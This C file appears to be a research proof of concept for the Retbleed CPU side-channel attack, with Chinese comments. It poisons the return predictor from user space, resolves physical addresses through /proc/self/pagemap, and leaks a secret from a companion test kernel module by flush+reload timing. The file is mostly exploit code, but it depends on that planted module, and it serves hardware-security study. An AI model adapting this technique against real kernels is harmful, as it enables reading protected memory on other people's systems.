// SPDX-License-Identifier: GPL-3.0-only
#include <err.h>
#include <setjmp.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include "./kmod_retbleed_poc/retbleed_poc_ioctl.h"
#include "common.h"

#define ROUNDS 10000
#define RB_PTR 0x3400000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x10

#define RET_PATH_LENGTH 30
typedef unsigned long u64;
typedef unsigned char u8;

__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

static void print_results(u64 *results, int n) {
    for (int i = 0; i < n; ++i) {
        printf("%lu ", results[i]);
    }
    puts("");
}

// va of the history setup space
#define HISTORY_SPACE 0x788888000000

// 1MiB is enough. We bgb uses only the lower 19 bits, and since there's a
// risk of overflowing (dst0=..7f...., src1=..80....) we can keep the lower 19 for
// the src and the lower 20 for the dst.
#define HISTORY_SZ    (1UL<<21) // 2MB

// fall inside the history buffer: ffffffff830000000 -> 0x30000000
// CPU 的 return predictor（RSB / BHB）并不是用完整的 RIP
#define HISTORY_MASK  (HISTORY_SZ-1)    // 低 21 bit

#define OP_RET 0xc3

int main(int argc, char *argv[])
{
    // 我们是“故意”制造非法返回路径，只为了训练 RSB
    setup_segv_handler();
    int fd_spec = open("/proc/" PROC_RETBLEED_POC, O_RDONLY);
    if(fd_spec < 0) {
        err(1, "open");
    }
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);

    // #define REQ_GADGET    222
    // #define REQ_SPECULATE 111
    // #define REQ_SECRET    333
    struct synth_gadget_desc sg = { 0 };
    // 从内核模块要信息;扫描 kernel text;找 RET gadget;找 speculative gadget;返回 physmap_base
    if (ioctl(fd_spec, REQ_GADGET, &sg) != 0) {
        err(1, "ioctl");
    }
    memset(results, 0, sizeof(results[0])*RB_SLOTS);
    u8* ret_path[RET_PATH_LENGTH+1] = {0};

    // 2MB用户空间用于构造返回历史
    u8* train_space = (u8*)HISTORY_SPACE;
    MAP_OR_DIE(train_space, HISTORY_SZ, PROT_RWX, MMAP_FLAGS, -1, 0);

    // 泄密gadget地址
    ret_path[0] = (u8*)sg.kbr_dst;
    for (int i = 0; i < RET_PATH_LENGTH; ++i) {
        // “伪造与内核 RET 源地址相同低位的返回历史”，用来污染 CPU 的返回预测器（RSB / BHB）    
        // 取内核中真实 RET 指令地址的“低位模式”
        // 构造出一个 用户态地址，其低位和 kernel RET 完全一致。
        ret_path[i+1] = train_space + (sg.kbr_src & HISTORY_MASK);
    }
    train_space[sg.kbr_src & HISTORY_MASK] = OP_RET;

    u8* rb_va = (u8*)RB_PTR;

    /* === 物理地址对齐探索 (已注释) === */
    /*
     * 探索目的: 现代内核(6.8.0)使用不同内存分配器，物理地址可能不2MB对齐
     * 尝试方法1: 遍历多个虚拟地址寻找2MB对齐的物理地址
     * 尝试方法2: 使用hugetlbfs (/dev/hugepages) 分配huge page
     * 尝试方法3: 使用madvise(MADV_HUGEPAGE)建议内核使用huge page
     *
     * 问题: 这些方法在当前系统上都无法保证2MB物理对齐
     * 原因: 新内核的THP分配策略变化，需要内核参数调整或使用旧内核
     */
#if 0
    // 方法1: 遍历搜索对齐地址
    int found = 0;
    for (unsigned long addr = 0x10000000; addr < 0x800000000; addr += 0x1000000) {
        rb_va = (u8*)addr;
        if (mmap(rb_va, 1<<21, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0) == MAP_FAILED) {
            continue;
        }
        madvise(rb_va, 1<<21, MADV_HUGEPAGE);

        u64 rb_pa_test = va_to_phys(fd_pagemap, addr);
        if (rb_pa_test != 0 && (rb_pa_test & 0x1fffff) == 0) {
            printf("Found aligned address: va=0x%lx, pa=0x%lx\n", addr, rb_pa_test);
            found = 1;
            break;
        }
        munmap(rb_va, 1<<21);
    }
    if (!found) {
        rb_va = (u8*)RB_PTR;
        mmap_huge(rb_va, 1<<21);
    }
#else
    // 原始方法: 使用mmap_huge分配
    // 分配2MB RB用于时序攻击测量
    mmap_huge(rb_va, 1<<21);
#endif
    /* === 探索结束 === */

    // 不能用于 kernel VA;THP / swap / COW 都会影响结果;需要权限（新内核通常禁止）
    u64 rb_pa = va_to_phys(fd_pagemap, (unsigned long)rb_va);
    // → 没映射 / 无权限
    if (rb_pa == 0) {
        fprintf(stderr, "rb: no pa\n");
        exit(1);
    // → not huge;物理地址必须是 2MB 对齐;kernel physmap 是 2MB huge-page 映射
    // 修改: 6.8.0内核物理地址不一定2MB对齐，但POC仍可运行，只是准确率降低
    } else if ((rb_pa & 0x1fffff) != 0) {
        fprintf(stderr, "rb: not huge (pa=0x%lx)\n", rb_pa);
        // 跳过对齐检查继续运行 (原版会exit(1))
        // exit(1);
    }

    u64 rb_kva = rb_pa + sg.physmap_base;
    printf("rb_pa   0x%lx\n", rb_pa);
    printf("rb_kva  0x%lx\n", rb_kva);
    printf("kbr_src 0x%lx\n", sg.kbr_src);
    printf("kbr_dst 0x%lx\n", sg.kbr_dst);
    printf("secret  0x%lx\n", sg.secret);

    struct payload p;
    p.secret = sg.secret;
    p.reload_buffer = rb_kva;

    flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
    for (int i = 0; i < ROUNDS; ++i) {
        asm("lfence");
        flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
        for (int j = 0; j < 2; ++j) {
            should_segfault = 1;
            // TODO:这是sigsetjmp的作用是什么?哪里来的env?各个参数的作用是什么?
            // 1表示保存信号掩码;12表示SIGLONGJMP的返回值
            int a = sigsetjmp(env, 1);
            if (a == 0) {
                // 执行 ret → SIGSEGV
                // 信号处理器调用 siglongjmp(env, 12)
                // 程序"跳回"到这里
                __asm__(
                        "mov %[retp], %%r10 \n\t"
                        ".rept " xstr(RET_PATH_LENGTH+1) "\n\t"
                            "pushq (%%r10)\n\t"
                            "add $8, %%r10\n\t"
                        ".endr\n\t"
                        "ret\n\t"
                        :: [retp]"r"(ret_path) : "rax", "rdi", "r8", "r10");
            }
            should_segfault = 0;    // siglongjmp 后执行这里
        }
        // 从内核模块要信息
        if (ioctl(fd_spec, REQ_SPECULATE, &p) != 0) { err(12, "ioctl"); }
        reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
    }
    print_results(results, RB_SLOTS);
    return 0;
}
